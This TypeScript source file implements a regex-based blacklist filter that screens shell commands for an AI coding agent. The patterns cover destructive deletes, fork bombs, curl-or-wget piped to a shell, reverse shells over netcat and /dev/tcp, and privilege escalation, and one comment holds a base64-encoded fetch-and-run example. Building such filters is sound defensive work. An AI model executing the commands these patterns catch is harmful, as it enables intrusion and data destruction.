// =============================================================================
// GHITA CODING AGENT - Phase 13: Shell Command Blacklist Security Guardrails
// Phân tích tĩnh lệnh terminal để chặn đứng các câu lệnh nhạy cảm
// Thừa kế logic direct-execution.ts của Composio
// =============================================================================

import { randomBytes } from 'node:crypto';
import type {
  ThreatSeverity,
  ThreatType,
  SecurityValidationResult,
  ThreatDetection,
  SecurityLogEntry,
  SecurityBlacklistConfig,
  CustomPatternEntry,
  ApprovalCallback,
} from './types.js';
import { DEFAULT_SECURITY_CONFIG, SECURITY_ERROR_PREFIX } from './types.js';

// =============================================================================
// Tác vụ 2: Blacklist regex patterns (từ Composio)
// =============================================================================

interface BlacklistRule {
  pattern: RegExp;
  type: ThreatType;
  severity: ThreatSeverity;
  description: string;
}

/**
 * Danh sách cấm mặc định — kế thừa từ Composio direct-execution.ts
 * Mở rộng thêm các pattern nguy hiểm cho môi trường GHITA
 */
const BUILTIN_BLACKLIST: BlacklistRule[] = [
  // Git conflict markers and malformed commands
  {
    pattern: /^(<<<<<<<|=======|>>>>>>>)/,
    type: 'destructive-command',
    severity: 'critical',
    description: 'Git conflict markers / malformed command',
  },
  // ── Tác vụ 1: Destructive commands ──
  {
    pattern: /\brm\s+(-[rRf]+\s+|--recursive\s+)(\/|~|\*|[A-Za-z]:\\|\.\.)/,
    type: 'destructive-command',
    severity: 'critical',
    description: 'Recursive delete on root/home/system paths',
  },
  {
    pattern: /\brm\s+-[rRf]*\s+\/\s*$/,
    type: 'destructive-command',
    severity: 'critical',
    description: 'rm -rf / (delete root filesystem)',
  },
  {
    pattern: /\bmkfs\b/,
    type: 'destructive-command',
    severity: 'critical',
    description: 'Format filesystem (mkfs)',
  },
  {
    pattern: /\bdd\s+.*of=\/dev\//,
    type: 'destructive-command',
    severity: 'critical',
    description: 'dd write to device (destructive disk operation)',
  },
  {
    pattern: />\s*\/dev\/sd[a-z]/,
    type: 'destructive-command',
    severity: 'critical',
    description: 'Direct write to block device',
  },
  {
    pattern: /\bchmod\s+777\s+\//,
    type: 'destructive-command',
    severity: 'high',
    description: 'chmod 777 on root (world-writable root)',
  },
  {
    pattern: /\bchown\s+.*\s+\//,
    type: 'destructive-command',
    severity: 'high',
    description: 'chown on root directory',
  },

  // ── Fork bomb ──
  {
    pattern: /:\(\)\s*\{\s*:\s*\|\s*:\s*&\s*\}\s*;/,
    type: 'fork-bomb',
    severity: 'critical',
    description: 'Fork bomb (:(){ :|:& };:)',
  },
  {
    pattern: /\bfork\b.*\bwhile\b.*\btrue\b/i,
    type: 'fork-bomb',
    severity: 'high',
    description: 'Potential fork bomb pattern (while true fork)',
  },

  // ── Tác vụ 4: Remote execution (curl|sh, wget|sh) ──
  {
    pattern: /\bcurl\b[^|]*\|\s*(sh|bash|zsh|dash|ksh)/,
    type: 'remote-execution',
    severity: 'critical',
    description: 'Pipe curl output to shell (remote code execution)',
  },
  {
    pattern: /\bwget\b[^|]*\|\s*(sh|bash|zsh|dash|ksh)/,
    type: 'remote-execution',
    severity: 'critical',
    description: 'Pipe wget output to shell (remote code execution)',
  },
  {
    pattern: /\bcurl\b.*\s+-[oO]\s*\S+.*&&.*\b(chmod|sh|bash)\b/,
    type: 'remote-execution',
    severity: 'critical',
    description: 'Download and execute (curl + chmod/sh)',
  },
  {
    pattern: /\bwget\b.*\s+-[oO]\s*\S+.*&&.*\b(chmod|sh|bash)\b/,
    type: 'remote-execution',
    severity: 'critical',
    description: 'Download and execute (wget + chmod/sh)',
  },
  {
    pattern: /\bcurl\b.*-k\b.*\|\s*(sh|bash)/,
    type: 'remote-execution',
    severity: 'critical',
    description: 'Insecure curl (skip TLS) piped to shell',
  },
  {
    pattern: /\|\s*base64\s+(?:-d|--decode)\s*\|\s*(sh|bash|zsh|dash|ksh)/,
    type: 'remote-execution',
    severity: 'critical',
    description: 'Base64 decode piped to shell (obfuscated remote execution)',
  },
  {
    pattern: /\bprintf\b[^|]*\|\s*(sh|bash|zsh|dash|ksh)/,
    type: 'remote-execution',
    severity: 'high',
    description: 'Printf piped to shell (potential encoded command execution)',
  },

  // ── Network exfiltration / Reverse shells ──
  {
    pattern: /\bnc\b\s+.*-[elpv]+\b/,
    type: 'network-exfiltration',
    severity: 'critical',
    description: 'Netcat listener (potential reverse shell)',
  },
  {
    pattern: /\bncat\b.*--listen/,
    type: 'network-exfiltration',
    severity: 'critical',
    description: 'Ncat listener (potential reverse shell)',
  },
  {
    pattern: /\/dev\/tcp\//,
    type: 'network-exfiltration',
    severity: 'critical',
    description: 'Bash /dev/tcp redirect (reverse shell)',
  },
  {
    pattern: /\bbash\s+-i\s+>&\s*\/dev\/tcp/,
    type: 'network-exfiltration',
    severity: 'critical',
    description: 'Interactive bash reverse shell',
  },
  {
    pattern: /\bpython[23]?\b.*\bsocket\b.*\bconnect\b/,
    type: 'network-exfiltration',
    severity: 'high',
    description: 'Python socket connect (potential reverse shell)',
  },

  // ── Privilege escalation ──
  {
    pattern: /\bsudo\s+su\b/,
    type: 'privilege-escalation',
    severity: 'high',
    description: 'sudo su (switch to root)',
  },
  {
    pattern: /\bsu\s+-\s*root/,
    type: 'privilege-escalation',
    severity: 'high',
    description: 'su - root (switch to root)',
  },
  {
    pattern: /\bsudo\s+.*\bpasswd\b/,
    type: 'privilege-escalation',
    severity: 'critical',
    description: 'sudo passwd (change root password)',
  },
  {
    pattern: /\bvisudo\b/,
    type: 'privilege-escalation',
    severity: 'critical',
    description: 'visudo (edit sudoers file)',
  },

  // ── Dangerous system modifications ──
  {
    pattern: /\bshutdown\b|\breboot\b|\binit\s+0\b|\binit\s+6\b/,
    type: 'destructive-command',
    severity: 'high',
    description: 'System shutdown/reboot',
  },
  {
    pattern: /\bkill\s+-9\s+1\b/,
    type: 'destructive-command',
    severity: 'critical',
    description: 'Kill PID 1 (init process)',
  },
  {
    pattern: /\bkillall\b/,
    type: 'destructive-command',
    severity: 'medium',
    description: 'killall (terminate all processes by name)',
  },
  {
    pattern: /\bpkill\b/,
    type: 'destructive-command',
    severity: 'medium',
    description: 'pkill (signal processes by name)',
  },
];

// =============================================================================
// Tác vụ 3: Shell parser — phát hiện base64 encoded commands
// =============================================================================

/**
 * Kiểm tra chuỗi có phải base64 encoded command không
 */
function isBase64EncodedCommand(s: string): boolean {
  // Loại bỏ whitespace và ký tự đặc biệt
  const cleaned = s.trim();

  // Kiểm tra format base64 cơ bản
  if (!/^[A-Za-z0-9+/]+=*$/.test(cleaned)) return false;
  if (cleaned.length < 8) return false; // Quá ngắn

  try {
    const decoded = Buffer.from(cleaned, 'base64').toString('utf-8');
    // Kiểm tra decoded có chứa lệnh shell không
    const shellIndicators = [
      /\bsh\b/,
      /\bbash\b/,
      /\bexec\b/,
      /\brun\b/,
      /\beval\b/,
      /\bimport\b/,
      /\brequire\b/,
      /\bsystem\b/,
      /\bspawn\b/,
      /\bchild_process\b/,
      /\brm\b/,
      /\bcurl\b/,
      /\bwget\b/,
      /\bsudo\b/,
      /\bchmod\b/,
      /\bchown\b/,
      /\bmkfs\b/,
      /\bdd\b/,
      /;\s*\w+/,
      /\|\s*\w+/,
      /&&\s*\w+/,
    ];
    return shellIndicators.some((re) => re.test(decoded));
  } catch {
    return false;
  }
}

/**
 * Phát hiện base64 encoded payload trong lệnh
 * Ví dụ: echo Y3VybCBodHRwOi8vZXZpbC5zaCB8IHNo | base64 -d | sh
 */
function detectBase64Threats(command: string): ThreatDetection[] {
  const threats: ThreatDetection[] = [];

  // Pattern 1: ... | base64 -d | ...
  const base64PipePattern = /(?:base64\s+(?:-d|--decode)\s*\|\s*(?:sh|bash|zsh))/i;
  const pipeMatch = base64PipePattern.exec(command);
  if (pipeMatch) {
    threats.push({
      type: 'obfuscated-command',
      severity: 'critical',
      description: 'Base64 decoded and piped to shell',
      matchedPattern: pipeMatch[0],
      position: pipeMatch.index,
    });
  }

  // Pattern 2: echo <base64> | base64 -d
  const echoBase64Pattern = /\becho\s+([A-Za-z0-9+/=]{16,})\s*\|\s*base64\s+(?:-d|--decode)/i;
  const echoMatch = echoBase64Pattern.exec(command);
  if (echoMatch) {
    const payload = echoMatch[1];
    if (payload && isBase64EncodedCommand(payload)) {
      const decoded = Buffer.from(payload, 'base64').toString('utf-8');
      threats.push({
        type: 'obfuscated-command',
        severity: 'critical',
        description: `Base64 encoded malicious command detected: "${decoded.slice(0, 80)}..."`,
        matchedPattern: echoMatch[0],
        position: echoMatch.index,
      });
    }
  }

  // Pattern 3: python/node -e "exec(__import__('base64').b64decode(...))"
  const execBase64Pattern =
    /(?:exec|eval)\s*\(\s*(?:__import__|require)\s*\(\s*['"]base64['"]\s*\)/i;
  const execMatch = execBase64Pattern.exec(command);
  if (execMatch) {
    threats.push({
      type: 'obfuscated-command',
      severity: 'critical',
      description: 'Runtime base64 decode and exec (code obfuscation)',
      matchedPattern: execMatch[0],
      position: execMatch.index,
    });
  }

  // Pattern 4: Hex encoded command — printf '\x72\x6d' etc.
  const hexPattern = /printf\s+['"](?:\\x[0-9a-fA-F]{2}){8,}['"]/;
  const hexMatch = hexPattern.exec(command);
  if (hexMatch) {
    threats.push({
      type: 'obfuscated-command',
      severity: 'high',
      description: 'Hex-encoded command via printf (obfuscation attempt)',
      matchedPattern: hexMatch[0],
      position: hexMatch.index,
    });
  }

  return threats;
}

// =============================================================================
// Tác vụ 5: Binary execution detection
// =============================================================================

/**
 * Phát hiện thực thi binary không rõ nguồn gốc
 */
function detectBinaryExecution(command: string): ThreatDetection[] {
  const threats: ThreatDetection[] = [];

  // Chạy file binary từ /tmp, /dev/shm, hoặc thư mục tạm
  const tmpExecPattern = /(?:\/tmp|\/dev\/shm|\/var\/tmp)\/[^\s]+\b/;
  const tmpMatch = tmpExecPattern.exec(command);
  if (
    tmpMatch &&
    !/\b(cat|less|more|head|tail|grep|file|ls|stat)\b/.test(command.slice(0, tmpMatch.index || 0))
  ) {
    threats.push({
      type: 'binary-execution',
      severity: 'high',
      description: 'Execution of binary from temporary directory',
      matchedPattern: tmpMatch[0],
      position: tmpMatch.index,
    });
  }

  // chmod +x trên file không rõ
  const chmodExecPattern = /\bchmod\s+[+]?x\s+([^;\s]+)/;
  const chmodMatch = chmodExecPattern.exec(command);
  if (chmodMatch) {
    const target = chmodMatch[1] || '';
    // Chỉ cảnh báo nếu target không phải script thông thường
    if (!/\.(sh|bash|py|js|ts|rb|pl)$/.test(target)) {
      threats.push({
        type: 'binary-execution',
        severity: 'medium',
        description: `chmod +x on non-script file: ${target}`,
        matchedPattern: chmodMatch[0],
        position: chmodMatch.index,
      });
    }
  }

  return threats;
}

// =============================================================================
// SandboxSecurityFilter — Lớp chính
// =============================================================================

/**
 * SandboxSecurityFilter — Bộ lọc bảo mật lệnh terminal
 *
 * Tác vụ 1: Viết bộ lọc tĩnh terminal
 * Tác vụ 2: So khớp blacklist regex từ Composio
 * Tác vụ 3: Phát hiện base64 encoded commands
 * Tác vụ 5: Cấm binary không rõ nguồn gốc
 * Tác vụ 10: Tùy chỉnh blacklist qua YAML
 */
export class SandboxSecurityFilter {
  private config: SecurityBlacklistConfig;
  private customRules: BlacklistRule[];
  private logs: SecurityLogEntry[] = [];
  private approvalCallback?: ApprovalCallback;

  constructor(config?: Partial<SecurityBlacklistConfig>) {
    this.config = {
      ...DEFAULT_SECURITY_CONFIG,
      ...config,
      whitelist: [...(config?.whitelist ?? DEFAULT_SECURITY_CONFIG.whitelist)],
      customPatterns: [...(config?.customPatterns ?? DEFAULT_SECURITY_CONFIG.customPatterns)],
    };
    this.customRules = this.compileCustomPatterns(this.config.customPatterns);
  }

  /**
   * Tác vụ 8: Đăng ký callback cho approval modal (Tauri GUI hoặc OLT remote)
   */
  setApprovalCallback(callback: ApprovalCallback): void {
    this.approvalCallback = callback;
  }

  // =========================================================================
  // Tác vụ 2: So khớp câu lệnh với Blacklist
  // =========================================================================

  /**
   * Kiểm tra lệnh terminal có an toàn không
   * @param cmd Lệnh terminal cần kiểm tra
   * @returns SecurityValidationResult
   */
  validateCommand(cmd: string): SecurityValidationResult {
    const threats: ThreatDetection[] = [];
    const trimmedCmd = cmd.trim();

    if (this.isWhitelisted(trimmedCmd)) {
      return {
        safe: true,
        command: trimmedCmd,
        threats: [],
        requiresApproval: false,
      };
    }

    for (const rule of BUILTIN_BLACKLIST) {
      if (rule.pattern.test(trimmedCmd)) {
        threats.push({
          type: rule.type,
          severity: rule.severity,
          description: rule.description,
          matchedPattern: rule.pattern.source,
        });
      }
    }

    for (const rule of this.customRules) {
      if (rule.pattern.test(trimmedCmd)) {
        threats.push({
          type: 'custom-blacklist',
          severity: rule.severity,
          description: rule.description,
          matchedPattern: rule.pattern.source,
        });
      }
    }

    if (this.config.detectBase64) {
      threats.push(...detectBase64Threats(trimmedCmd));
    }

    if (this.config.detectBinaryExecution) {
      threats.push(...detectBinaryExecution(trimmedCmd));
    }

    const maxSeverity = this.getMaxSeverity(threats);
    const safe = threats.length === 0;

    let requiresApproval = false;
    if (this.config.executionMode === 'dev') {
      requiresApproval = true;
    } else {
      requiresApproval =
        !safe &&
        (maxSeverity === 'high' || maxSeverity === 'medium') &&
        this.config.requireApprovalForHigh;
    }

    const errorCode = !safe
      ? `${SECURITY_ERROR_PREFIX}-${this.getErrorCode(maxSeverity)}`
      : undefined;

    return {
      safe,
      command: trimmedCmd,
      threats,
      requiresApproval,
      errorCode,
    };
  }

  validate(cmd: string): SecurityValidationResult {
    return this.validateCommand(cmd);
  }

  // =========================================================================
  // Tác vụ 6: Phê duyệt qua GUI / OLT
  // =========================================================================

  /**
   * Validate và xin phê duyệt nếu cần
   * Nếu lệnh nguy hiểm nhưng kỹ sư approve => cho phép
   */
  async validateAndMaybeApprove(cmd: string): Promise<{
    allowed: boolean;
    result: SecurityValidationResult;
  }> {
    const result = this.validateCommand(cmd);

    // An toàn — cho phép ngay
    if (result.safe) {
      return { allowed: true, result };
    }

    // Critical — chặn đứng, không cho approve
    const maxSeverity = this.getMaxSeverity(result.threats);
    if (maxSeverity === 'critical') {
      this.logEntry(result, false, 'local');
      return { allowed: false, result };
    }

    // High/Medium — xin phê duyệt qua callback
    if (result.requiresApproval && this.approvalCallback) {
      const approved = await this.approvalCallback.requestApproval(cmd, result.threats);
      this.logEntry(result, approved, 'local');
      return { allowed: approved, result };
    }

    // Không có callback => chặn
    this.logEntry(result, false, 'local');
    return { allowed: false, result };
  }

  // =========================================================================
  // Tác vụ 7: Logs bảo mật
  // =========================================================================

  /**
   * Lấy tất cả security logs
   */
  getLogs(): SecurityLogEntry[] {
    return [...this.logs];
  }

  /**
   * Lấy các lệnh bị chặn gần đây
   */
  getBlockedCommands(limit = 50): SecurityLogEntry[] {
    return this.logs.filter((l) => !l.result.safe && l.approved !== true).slice(-limit);
  }

  /**
   * Xóa logs cũ
   */
  clearLogs(): void {
    this.logs = [];
  }

  // =========================================================================
  // Tác vụ 10: Cấu hình YAML tùy chỉnh
  // =========================================================================

  /**
   * Cập nhật cấu hình từ .ghita/security-blacklist.yaml
   */
  updateConfig(config: Partial<SecurityBlacklistConfig>): void {
    this.config = { ...this.config, ...config };
    if (config.customPatterns) {
      this.customRules = this.compileCustomPatterns(config.customPatterns);
    }
  }

  /**
   * Thêm whitelist entry
   */
  addToWhitelist(command: string): void {
    if (!this.config.whitelist.includes(command)) {
      this.config.whitelist.push(command);
    }
  }

  /**
   * Xóa whitelist entry
   */
  removeFromWhitelist(command: string): void {
    this.config.whitelist = this.config.whitelist.filter((w) => w !== command);
  }

  // =========================================================================
  // Private helpers
  // =========================================================================

  private isWhitelisted(cmd: string): boolean {
    return this.config.whitelist.some((w) => cmd.startsWith(w));
  }

  private compileCustomPatterns(patterns: CustomPatternEntry[]): BlacklistRule[] {
    return patterns.map((p) => ({
      pattern: new RegExp(p.pattern, 'i'),
      type: 'custom-blacklist' as ThreatType,
      severity: p.severity,
      description: p.description,
    }));
  }

  private getMaxSeverity(threats: ThreatDetection[]): ThreatSeverity | null {
    if (threats.length === 0) return null;
    const order: ThreatSeverity[] = ['low', 'medium', 'high', 'critical'];
    let max = 0;
    for (const t of threats) {
      const idx = order.indexOf(t.severity);
      if (idx > max) max = idx;
    }
    return order[max] || null;
  }

  private getErrorCode(severity: ThreatSeverity | null): string {
    switch (severity) {
      case 'critical':
        return '001';
      case 'high':
        return '002';
      case 'medium':
        return '003';
      case 'low':
        return '004';
      default:
        return '000';
    }
  }

  private logEntry(
    result: SecurityValidationResult,
    approved: boolean,
    source: 'local' | 'remote-olt',
  ): void {
    this.logs.push({
      id: randomBytes(8).toString('hex'),
      command: result.command,
      result,
      approved,
      timestamp: new Date(),
      source,
    });
  }
}

/**
 * Factory function tạo filter mặc định
 */
export function createSecurityFilter(
  config?: Partial<SecurityBlacklistConfig>,
): SandboxSecurityFilter {
  return new SandboxSecurityFilter(config);
}
